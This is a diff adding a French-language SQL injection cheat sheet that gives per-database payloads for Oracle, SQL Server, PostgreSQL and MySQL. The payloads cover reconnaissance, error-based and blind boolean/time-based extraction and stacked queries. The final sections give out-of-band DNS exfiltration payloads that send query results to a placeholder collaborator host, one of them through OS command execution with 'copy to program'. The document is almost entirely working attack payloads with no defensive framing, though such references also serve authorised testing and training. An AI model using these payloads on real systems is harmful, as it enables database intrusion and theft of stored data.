@@ -1,0 +1,155 @@
+================================================================================
+SQL INJECTION CHEAT SHEET
+================================================================================
+
+1. MANIPULATION DE CHAINES (STRING CONCATENATION)
+--------------------------------------------------------------------------------
+Oracle     : 'foo'||'bar'
+Microsoft  : 'foo'+'bar'
+PostgreSQL : 'foo'||'bar'
+MySQL      : 'foo' 'bar' (espace entre les chaines)
+             CONCAT('foo','bar')
+
+SUBSTRING (Index commence a 1)
+Oracle     : SUBSTR('foobar', 4, 2)
+Microsoft  : SUBSTRING('foobar', 4, 2)
+PostgreSQL : SUBSTRING('foobar', 4, 2)
+MySQL      : SUBSTRING('foobar', 4, 2)
+
+
+2. COMMENTAIRES
+--------------------------------------------------------------------------------
+Oracle     : --comment
+Microsoft  : --comment
+             /*comment*/
+PostgreSQL : --comment
+             /*comment*/
+MySQL      : #comment
+             -- comment (Espace OBLIGATOIRE apres les tirets)
+             /*comment*/
+
+
+3. RECONNAISSANCE ET VERSION
+--------------------------------------------------------------------------------
+Oracle     : SELECT banner FROM v$version
+             SELECT version FROM v$instance
+Microsoft  : SELECT @@version
+PostgreSQL : SELECT version()
+MySQL      : SELECT @@version
+
+
+4. CONTENU DE LA BASE (TABLES ET COLONNES)
+--------------------------------------------------------------------------------
+Oracle :
+  SELECT * FROM all_tables
+  SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'
+
+Microsoft / PostgreSQL / MySQL :
+  SELECT * FROM information_schema.tables
+  SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
+
+
+5. ERREURS CONDITIONNELLES (BOOLEAN INFERENCE)
+--------------------------------------------------------------------------------
+Oracle :
+  SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual
+
+Microsoft :
+  SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END
+
+PostgreSQL :
+  1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/(SELECT 0) ELSE NULL END)
+
+MySQL :
+  SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')
+
+
+6. EXTRACTION VIA MESSAGES D'ERREUR (ERROR-BASED)
+--------------------------------------------------------------------------------
+Microsoft :
+  SELECT 'foo' WHERE 1 = (SELECT 'secret')
+  > Resultat : Conversion failed when converting the varchar value 'secret' to data type int.
+
+PostgreSQL :
+  SELECT CAST((SELECT password FROM users LIMIT 1) AS int)
+  > Resultat : invalid input syntax for integer: "secret"
+
+MySQL :
+  SELECT 'foo' WHERE 1=1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT 'secret')))
+  > Resultat : XPATH syntax error: '\secret'
+
+
+7. TIME-BASED BLIND (DELAIS)
+--------------------------------------------------------------------------------
+Oracle     : dbms_pipe.receive_message(('a'),10)
+Microsoft  : WAITFOR DELAY '0:0:10'
+PostgreSQL : SELECT pg_sleep(10)
+MySQL      : SELECT SLEEP(10)
+
+
+8. TIME-BASED CONDITIONNEL
+--------------------------------------------------------------------------------
+Oracle :
+  SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual
+
+Microsoft :
+  IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'
+
+PostgreSQL :
+  SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END
+
+MySQL :
+  SELECT IF(YOUR-CONDITION-HERE,SLEEP(10),'a')
+
+
+9. REQUETES EMPILEES (STACKED QUERIES)
+--------------------------------------------------------------------------------
+Oracle     : Non supporte.
+Microsoft  : QUERY-1-HERE; QUERY-2-HERE
+PostgreSQL : QUERY-1-HERE; QUERY-2-HERE
+MySQL      : QUERY-1-HERE; QUERY-2-HERE
+             (Note: Rarement possible en contexte web, depend de l'API PHP/Python utilisee)
+
+
+10. DNS LOOKUP / OOB (OUT OF BAND)
+--------------------------------------------------------------------------------
+Oracle (XXE Vuln) :
+  SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual
+
+Oracle (Privileges Eleves) :
+  SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')
+
+Microsoft :
+  exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'
+
+PostgreSQL :
+  copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'
+
+MySQL (Windows Uniquement) :
+  LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')
+  OU
+  SELECT ... INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'
+
+
+11. DNS EXFILTRATION (DATA DANS LE SOUS-DOMAINE)
+--------------------------------------------------------------------------------
+Oracle :
+  SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual
+
+Microsoft :
+  declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec('master..xp_dirtree "//'+@p+'.BURP-COLLABORATOR-SUBDOMAIN/a"')
+
+PostgreSQL :
+  create OR replace function f() returns void as $$
+  declare c text;
+  declare p text;
+  begin
+  SELECT into p (SELECT YOUR-QUERY-HERE);
+  c := 'copy (SELECT '''') to program ''nslookup '||p||'.BURP-COLLABORATOR-SUBDOMAIN''';
+  execute c;
+  END;
+  $$ language plpgsql security definer;
+  SELECT f();
+
+MySQL (Windows Uniquement) :
+  SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'
